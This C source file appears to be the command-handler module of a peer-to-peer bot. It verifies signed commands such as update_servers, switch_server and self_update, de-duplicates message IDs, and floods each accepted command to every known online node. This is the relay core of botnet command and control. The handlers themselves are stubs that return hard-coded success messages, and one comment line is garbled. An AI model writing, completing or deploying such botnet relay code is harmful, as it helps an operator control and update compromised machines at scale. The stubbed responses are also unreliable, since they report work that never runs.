#include "p2p_bot.h"
#include <stdio.h>
#include <string.h>

#pragma execution_character_set("utf-8")

// ʹʹexternȫȫֱ
extern COMMAND_HANDLER g_command_handler;
extern P2P_CORE g_p2p_core;

// 新增洪泛控制全局变量
static CRITICAL_SECTION g_flood_control_cs;
static char g_recent_message_ids[100][37]; // 存储最近处理的消息ID
static int g_recent_message_count = 0;
static unsigned long long g_last_cleanup_time = 0;

// Command handler functions
int handle_update_servers(COMMAND_MESSAGE* cmd, COMMAND_RESULT* result) {
    if (!cmd || !result) return 0;

    result->status = 1;
    strcpy_s(result->response, sizeof(result->response), "Servers updated successfully");
    result->execution_time = 100;
    result->timestamp = get_timestamp();

    return 1;
}

int handle_switch_server(COMMAND_MESSAGE* cmd, COMMAND_RESULT* result) {
    if (!cmd || !result) return 0;

    result->status = 1;
    strcpy_s(result->response, sizeof(result->response), "Server switched successfully");
    result->execution_time = 50;
    result->timestamp = get_timestamp();

    return 1;
}

int handle_self_update(COMMAND_MESSAGE* cmd, COMMAND_RESULT* result) {
    if (!cmd || !result) return 0;

    result->status = 1;
    strcpy_s(result->response, sizeof(result->response), "Self-update completed successfully");
    result->execution_time = 200;
    result->timestamp = get_timestamp();

    return 1;
}

int handle_get_info(COMMAND_MESSAGE* cmd, COMMAND_RESULT* result) {
    if (!cmd || !result) return 0;

    result->status = 1;

    char info[1024];
    sprintf_s(info, sizeof(info), "Node Information:\nID: %s\nStatus: Running\nUptime: 3600 seconds",
        cmd->cmd_data.args[0]);

    strcpy_s(result->response, sizeof(result->response), info);
    result->execution_time = 10;
    result->timestamp = get_timestamp();

    return 1;
}

// Command mapping table
typedef struct {
    char command_name[32];
    COMMAND_FUNC handler;
} COMMAND_ENTRY;

static COMMAND_ENTRY g_command_handlers[] = {
    {"update_servers", handle_update_servers},
    {"switch_server", handle_switch_server},
    {"self_update", handle_self_update},
    {"get_info", handle_get_info},
    {"", NULL}
};

// 新增洪泛控制函数
int is_message_already_processed(const char* message_id) {
    EnterCriticalSection(&g_flood_control_cs);

    int found = 0;
    for (int i = 0; i < g_recent_message_count; i++) {
        if (strcmp(g_recent_message_ids[i], message_id) == 0) {
            found = 1;
            break;
        }
    }

    LeaveCriticalSection(&g_flood_control_cs);
    return found;
}

void mark_message_processed(const char* message_id) {
    EnterCriticalSection(&g_flood_control_cs);

    // 清理5分钟前的记录
    unsigned long long current_time = get_timestamp();
    if (current_time - g_last_cleanup_time > 300) {
        g_recent_message_count = 0;
        g_last_cleanup_time = current_time;
    }

    if (g_recent_message_count < 100) {
        strcpy_s(g_recent_message_ids[g_recent_message_count],
            sizeof(g_recent_message_ids[g_recent_message_count]), message_id);
        g_recent_message_count++;
    }
    else {
        // 队列满，淘汰最旧的记录
        memmove(g_recent_message_ids, g_recent_message_ids + 1, sizeof(g_recent_message_ids[0]) * 99);
        strcpy_s(g_recent_message_ids[99], sizeof(g_recent_message_ids[99]), message_id);
    }

    LeaveCriticalSection(&g_flood_control_cs);
}

int should_flood_command(const COMMAND_MESSAGE* cmd) {
    if (!cmd) return 0;

    // 需要洪泛的命令类型
    const char* flood_commands[] = {
        "update_servers", "switch_server", "self_update",
        "transfer_file", "get_info", ""
    };

    for (int i = 0; strlen(flood_commands[i]) > 0; i++) {
        if (strcmp(cmd->cmd_data.command, flood_commands[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

void flood_command_to_network(COMMAND_HANDLER* handler, const NETWORK_MESSAGE* msg) {
    if (!handler || !msg) return;

    printf("[Flood] Starting command flooding for message: %s\n", msg->message_id);

    // 创建洪泛消息（新消息ID避免循环）
    NETWORK_MESSAGE flood_msg = *msg;
    generate_message_id(flood_msg.message_id);
    flood_msg.timestamp = get_timestamp();

    // 广播到所有已知节点（除了原发送者）
    EnterCriticalSection(&g_nodes_cs);

    int nodes_contacted = 0;
    for (unsigned int i = 0; i < g_node_count; i++) {
        if (g_known_nodes[i].state == NODE_STATE_ONLINE &&
            strcmp(g_known_nodes[i].node_id, msg->sender_id) != 0) {

            struct sockaddr_in target_addr;
            memset(&target_addr, 0, sizeof(target_addr));
            target_addr.sin_family = AF_INET;
            inet_pton(AF_INET, g_known_nodes[i].ip_address, &target_addr.sin_addr);
            target_addr.sin_port = htons(g_known_nodes[i].port);

            int result = sendto(handler->p2p_core->listen_socket,
                (const char*)&flood_msg, sizeof(NETWORK_MESSAGE), 0,
                (struct sockaddr*)&target_addr, sizeof(target_addr));

            if (result != SOCKET_ERROR) {
                nodes_contacted++;
                if (nodes_contacted <= 3) { // 限制日志数量
                    printf("[Flood] Command sent to: %s\n", g_known_nodes[i].node_id);
                }
            }

            // 小延迟避免拥塞
            if (nodes_contacted % 5 == 0) {
                Sleep(1);
            }
        }
    }

    LeaveCriticalSection(&g_nodes_cs);
    printf("[Flood] Command flooding completed. Sent to %d nodes\n", nodes_contacted);
}

// Initialize command handler
int command_handler_init(COMMAND_HANDLER* handler, P2P_CORE* p2p_core) {
    if (!handler || !p2p_core) return 0;

    memset(handler, 0, sizeof(COMMAND_HANDLER));
    handler->p2p_core = p2p_core;
    handler->running = 0;

    InitializeCriticalSection(&handler->command_cs);

    // 初始化洪泛控制
    InitializeCriticalSection(&g_flood_control_cs);
    g_recent_message_count = 0;
    g_last_cleanup_time = get_timestamp();

    return 1;
}

void command_handler_cleanup(COMMAND_HANDLER* handler) {
    if (!handler) return;

    command_handler_stop(handler);
    DeleteCriticalSection(&handler->command_cs);

    // 清理洪泛控制
    DeleteCriticalSection(&g_flood_control_cs);
}

// Process messages in the message queue
int command_handler_process_message(COMMAND_HANDLER* handler, const NETWORK_MESSAGE* msg) {
    if (!handler || !msg || msg->message_type != MSG_TYPE_COMMAND) return 0;

    // 检查重复消息
    if (is_message_already_processed(msg->message_id)) {
        printf("[Command] Ignoring duplicate message: %s\n", msg->message_id);
        return 0;
    }
    mark_message_processed(msg->message_id);

    // Parse message
    COMMAND_MESSAGE cmd;
    if (msg->data_size >= sizeof(COMMAND_MESSAGE)) {
        memcpy(&cmd, msg->data, sizeof(COMMAND_MESSAGE));

        // Verify timestamp
        unsigned long long current_time = get_timestamp();
        if (cmd.cmd_data.timestamp > current_time ||
            current_time - cmd.cmd_data.timestamp > COMMAND_TIMEOUT) {
            printf("[Command] Invalid timestamp: command=%llu, current=%llu\n",
                cmd.cmd_data.timestamp, current_time);
            return 0;
        }

        // Verify signature
        unsigned char sender_pub_key[PUBLIC_KEY_SIZE];
        unsigned char signature[SIGNATURE_SIZE];

        if (hex_decode(cmd.cmd_data.sender_pub_key, sender_pub_key, PUBLIC_KEY_SIZE) == PUBLIC_KEY_SIZE &&
            hex_decode(cmd.signature, signature, SIGNATURE_SIZE) == SIGNATURE_SIZE) {

            // Verify signature using ECDSA algorithm
            if (crypto_verify(sender_pub_key, (unsigned char*)&cmd.cmd_data,
                sizeof(cmd.cmd_data), signature)) {

                // Find command handler
                for (int i = 0; g_command_handlers[i].handler != NULL; i++) {
                    if (strcmp(g_command_handlers[i].command_name, cmd.cmd_data.command) == 0) {
                        COMMAND_RESULT result;
                        if (g_command_handlers[i].handler(&cmd, &result)) {
                            // 洪泛传播合法命令
                            if (should_flood_command(&cmd)) {
                                printf("[Command] Flooding valid command: %s\n", cmd.cmd_data.command);
                                flood_command_to_network(handler, msg);
                            }

                            // Send response
                            command_handler_send_response(handler, msg->sender_id, &result);
                            return 1;
                        }
                    }
                }
            }
            else {
                printf("[Command] Signature verification failed\n");
            }
        }
        else {
            printf("[Command] Hex decoding failed\n");
        }
    }

    return 0;
}

// Send response
int command_handler_send_response(COMMAND_HANDLER* handler, const char* recipient_id, const COMMAND_RESULT* result) {
    if (!handler || !recipient_id || !result) return 0;

    NETWORK_MESSAGE response_msg;
    memset(&response_msg, 0, sizeof(NETWORK_MESSAGE));

    generate_message_id(response_msg.message_id);
    strcpy_s(response_msg.sender_id, sizeof(response_msg.sender_id), handler->p2p_core->node_id);
    strcpy_s(response_msg.recipient_id, sizeof(response_msg.recipient_id), recipient_id);
    response_msg.message_type = MSG_TYPE_RESPONSE;
    response_msg.timestamp = get_timestamp();
    response_msg.encrypted = 1;

    memcpy(response_msg.data, result, sizeof(COMMAND_RESULT));
    response_msg.data_size = sizeof(COMMAND_RESULT);

    // Broadcast response message
    return p2p_broadcast_message(handler->p2p_core, &response_msg);
}

// Command handler thread
unsigned __stdcall command_thread(void* param) {
    COMMAND_HANDLER* handler = (COMMAND_HANDLER*)param;

    if (!handler) {
        printf("[Command] Error: Command thread received null handler\n");
        return 0;
    }

    printf("[Command] Command handler thread started\n");

    while (handler->running) {
        Sleep(100);
    }

    printf("[Command] Command handler thread exited\n");
    return 1;
}

int command_handler_start(COMMAND_HANDLER* handler) {
    if (!handler || handler->running) return 0;

    handler->running = 1;
    handler->command_thread = (HANDLE)_beginthreadex(NULL, 0, command_thread, handler, 0, NULL);

    if (handler->command_thread == NULL) {
        printf("[Command] Failed to create command thread\n");
        handler->running = 0;
        return 0;
    }

    printf("[Command] Command handler started successfully\n");
    return 1;
}

void command_handler_stop(COMMAND_HANDLER* handler) {
    if (!handler || !handler->running) return;

    printf("[Command] Stopping command handler...\n");
    handler->running = 0;
    if (handler->command_thread) {
        WaitForSingleObject(handler->command_thread, 5000);
        CloseHandle(handler->command_thread);
        handler->command_thread = NULL;
    }
    printf("[Command] Command handler stopped\n");
}